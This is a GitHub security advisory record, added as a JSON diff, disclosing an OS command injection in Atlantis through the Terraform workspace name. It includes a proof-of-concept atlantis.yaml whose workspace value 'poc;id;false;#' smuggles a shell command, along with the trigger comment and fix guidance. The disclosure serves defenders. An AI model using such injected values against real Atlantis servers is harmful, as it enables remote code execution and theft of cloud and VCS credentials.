@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-rjh2-4xgw-p2hj",
+  "modified": "2026-10-27T21:15:03.794452143Z",
+  "published": "2026-10-27T21:04:50Z",
+  "aliases": [
+    "CVE-2026-116676"
+  ],
+  "summary": "Atlantis: OS command injection through PR-controlled Terraform workspace enables RCE during plan",
+  "details": "### Summary\n\nAtlantis passes the Terraform `workspace` value from a pull request's `atlantis.yaml` into a shell command without quoting or escaping it.\n\nA contributor whose pull request is eligible for an Atlantis plan can include shell metacharacters in the workspace name and execute arbitrary commands as the Atlantis service account. This does not require custom workflows, `allow_custom_workflows`, or permission to run `terraform apply`.\n\nThe executed command inherits the Atlantis process environment, which commonly contains cloud-provider, Terraform, and VCS credentials.\n\n### Details\n\nVerified against current `upstream/main` commit `92ce5c51d1a050357e44df3535483425e59fa984` on August 13, 2026.\n\nThe vulnerable data flow is:\n\n1. The PR-controlled project workspace is validated in [`server/core/config/raw/project.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/config/raw/project.go#L139-L149).\n\n   Validation rejects only `..`, `/`, and `\\`. Shell metacharacters such as `;`, `#`, `$`, redirections, and whitespace remain permitted.\n\n2. The workspace is passed directly as a Terraform command argument in [`server/core/runtime/workspace_step_runner_delegate.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/runtime/workspace_step_runner_delegate.go#L86-L96):\n\n   ```go\n   []string{workspaceCmd, \"select\", ctx.Workspace}\n   ```\n\n3. Terraform arguments are concatenated into a single string using `strings.Join(args, \" \")` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L451-L468):\n\n   ```go\n   tfCmd := fmt.Sprintf(\"%s %s\", binPath, strings.Join(args, \" \"))\n   ```\n\n4. The resulting string is executed through `sh -c` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L416-L427):\n\n   ```go\n   cmd := exec.Command(\"sh\", \"-c\", tfCmd)\n   ```\n\nConsequently, a workspace such as:\n\n```text\npoc;id;false;#\n```\n\nproduces commands equivalent to:\n\n```sh\nterraform workspace select poc;id;false;#\nterraform workspace new poc;id;false;#\n```\n\n`raw.Project.Validate()` was confirmed to return no error for this workspace value.\n\nAtlantis documents that planning untrusted Terraform can already be dangerous because providers and external data sources execute code. The distinct issue here is that an ordinary project configuration field becomes shell source, bypassing the explicit `allow_custom_workflows` control and requiring no malicious provider, external data source, custom workflow, or apply operation.\n\nThe primary remediation should be to execute Terraform using an argument vector rather than constructing shell source—for example, `exec.Command(binaryPath, args...)`. Any required environment-variable expansion should be performed without invoking a shell. Strict workspace-name validation would also provide defense in depth.\n\n### PoC\n\nOnly reproduce this against a disposable Atlantis instance and test repository.\n\n#### Preconditions\n\n- Atlantis processes `atlantis.yaml` from the pull request branch.\n- The pull request is eligible to run `atlantis plan`.\n- For a fork pull request, the server must have `--allow-fork-prs` enabled. A same-repository branch does not require this flag.\n- No custom workflows or apply permissions are required.\n\n#### Repository contents\n\nCreate `main.tf`:\n\n```hcl\nterraform {\n  required_version = \"\u003e= 1.0\"\n}\n```\n\nCreate `atlantis.yaml`:\n\n```yaml\nversion: 3\nprojects:\n  - name: workspace-rce-poc\n    dir: .\n    workspace: \"poc;id;false;#\"\n    autoplan:\n      enabled: false\n```\n\nOpen a pull request containing these files and comment:\n\n```text\natlantis plan -p workspace-rce-poc\n```\n\n#### Expected result\n\nAtlantis first runs `terraform workspace select`. The injected `false` causes that command invocation to return an error, so Atlantis retries using `terraform workspace new`.\n\nOn both attempts, the shell executes `id` as a separate command. The second failure includes the combined command output in the Atlantis error response, exposing output similar to:\n\n```text\nuid=1000(atlantis) gid=1000(atlantis) groups=1000(atlantis)\n```\n\nThis demonstrates arbitrary shell-command execution without creating a custom workflow or reaching the apply phase.\n\nThe payload uses only `id` and `false` and does not access credentials, make network requests, or modify the host beyond Terraform potentially creating the disposable `poc` workspace.\n\n### Impact\n\nThis is an OS command injection vulnerability  resulting in remote code execution as the Atlantis service account.\n\nAffected deployments are those that:\n\n- Process pull-request-controlled `atlantis.yaml` project configuration; and\n- Permit the attacker-controlled pull request to trigger an Atlantis plan.\n\nPotential consequences include:\n\n- Reading and exfiltrating cloud-provider, Terraform, and VCS credentials inherited from the Atlantis process.\n- Accessing Terraform state, plan files, repository checkouts, caches, and other data available to the Atlantis user.\n- Modifying files or binaries accessible to the service account.\n- Making network requests using the Atlantis server's network identity.\n- Pivoting into infrastructure accessible through the server's credentials or network placement.\n\nFor public repositories, arbitrary external contributors are directly exposed when `--allow-fork-prs` is enabled. Without fork PR support, the vulnerable population includes users able to create eligible same-repository pull requests and attackers controlling such accounts.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/runatlantis/atlantis",
+        "purl": "pkg:golang/github.com/runatlantis/atlantis"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.4.0"
+            },
+            {
+              "fixed": "0.47.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.47.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rjh2-4xgw-p2hj/GHSA-rjh2-4xgw-p2hj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/runatlantis/atlantis/security/advisories/GHSA-rjh2-4xgw-p2hj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116676"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/runatlantis/atlantis/pull/6792"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/runatlantis/atlantis/commit/8dd22b4d0a9d7c129fdbf6a3398dd1c4cf8c3a59"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/runatlantis/atlantis/commit/f04df0d53f0544d9eb6f5026dd8b74fbefd82ac8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/runatlantis/atlantis"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/runatlantis/atlantis/releases/tag/v0.47.1"
+    }
+  ]
+}
